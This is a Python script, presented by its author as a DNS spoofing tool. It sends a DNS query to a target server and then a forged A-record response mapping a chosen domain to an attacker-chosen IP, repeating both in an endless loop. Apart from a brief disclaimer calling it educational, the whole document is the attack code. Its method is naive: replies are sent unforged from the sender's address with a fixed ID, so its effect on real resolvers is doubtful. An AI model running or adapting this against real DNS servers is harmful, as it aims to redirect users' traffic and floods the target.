"""
This is a DNS spoofing script.

This script sends a DNS query to a specified server and then sends a spoofed response to the same server.
The spoofed response contains a specified IP address for a specified domain.

This script is for educational purposes only. DNS spoofing is illegal and unethical.

Usage:
    python dns_spoof.py
    
Author:
    aoyu (ngaoyu27@gmail.com)
    
Version:
    1.0
    
Date:
    8 June 2024
"""

import socket
import struct


# Constants
QUERY_ID = 20000
DNS_PORT = 53
FLAGS_QUERY = 0x0100
FLAGS_RESPONSE = 0x8180


def query_for_config():
    """
    Gets the configuration for the DNS spoofing attack from the user.
    """
    
    server_ip = input("Enter the IP of the DNS server to attack: ")
    query_domain = input("Enter the domain to spoof: ")
    spoofed_ip = input("Enter the IP to which you want to spoof the domain: ")
    
    return server_ip, query_domain, spoofed_ip


def manual_config():
    """
    Manually sets the configuration for the DNS spoofing attack.
    """
    
    server_ip = "10.0.0.1"
    query_domain = "test123.com"
    spoofed_ip = "192.168.56.12"

    return server_ip, query_domain, spoofed_ip


def create_socket() -> socket.socket:
    """
    Creates a UDP socket for sending and receiving DNS packets.
    
    Returns:
        socket.socket: The created socket.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return sock
    except socket.error as e:
        print("Socket error: ", e)
        return None


def encode_domain(domain: str) -> bytes:
    """
    Encodes a domain name in the DNS format, which involves separating each label with its length.
    
    Args:
        domain (str): The domain name to encode.
        
    Returns:
        bytes: The encoded domain name.
    """
    labels = domain.split('.')
    encoded = b''.join(struct.pack('B', len(label)) + label.encode('utf-8') for label in labels)
    return encoded + b'\x00'  # Null byte to end the domain name


def send_dns_query(server_ip: str, query_domain: str) -> None:
    """
    Sends a DNS query to the specified server for the specified domain.
    
    Args:
        server_ip (str): The IP address of the DNS server.
        query_domain (str): The domain name to query.
    """
    server_sock = create_socket()
    
    if server_sock is None:
        return

    try:
        header = struct.pack('>HHHHHH', QUERY_ID, FLAGS_QUERY, 1, 0, 0, 0)
        question = encode_domain(query_domain) + struct.pack('>HH', 1, 1)  # Type A, Class IN

        packet = header + question
        server_sock.sendto(packet, (server_ip, DNS_PORT))
        print(f"Sent DNS query for {query_domain} to {server_ip}")
        
    except socket.error as e:
        print("Socket error: ", e)
        
    except Exception as e:
        print("Error: ", e)
        
    finally: 
        server_sock.close()


def send_spoofed_response(server_ip: str, query_domain: str, spoofed_ip: str) -> None:
    """
    Sends a spoofed DNS response to the specified server for the specified domain with the specified IP.
    
    Args:
        server_ip (str): The IP address of the DNS server.
        query_domain (str): The domain name to spoof.
        spoofed_ip (str): The IP address to use in the spoofed response.
    """
    server_sock = create_socket()
    
    if server_sock is None:
        return

    try:
        header = struct.pack('>HHHHHH', QUERY_ID, FLAGS_RESPONSE, 1, 1, 0, 0)
        question = encode_domain(query_domain) + struct.pack('>HH', 1, 1)  # Type A, Class IN

        answer_name = struct.pack('B', 0xc0) + struct.pack('B', 0x0c)  # Pointer to the domain name in the question
        answer_type = struct.pack('>H', 1)  # Type A
        answer_class = struct.pack('>H', 1)  # Class IN
        answer_ttl = struct.pack('>I', 300)  # TTL 300 seconds
        answer_rdlength = struct.pack('>H', 4)  # Length of the RDATA field (4 bytes for IPv4)
        answer_rdata = socket.inet_aton(spoofed_ip)  # Spoofed IP address

        answer = answer_name + answer_type + answer_class + answer_ttl + answer_rdlength + answer_rdata
        packet = header + question + answer

        server_sock.sendto(packet, (server_ip, DNS_PORT))
        print(f"Sent spoofed response for {query_domain} with IP {spoofed_ip} to {server_ip}")

    except socket.error as e:
        print("Socket error: ", e)

    except Exception as e:
        print("Error: ", e)

    finally:
        server_sock.close()


def main():
    
    # server_ip, query_domain, spoofed_ip = query_for_config()
    server_ip, query_domain, spoofed_ip = manual_config()

    while True:
        send_dns_query(server_ip, query_domain)
        send_spoofed_response(server_ip, query_domain, spoofed_ip)


if __name__ == "__main__":
    main()
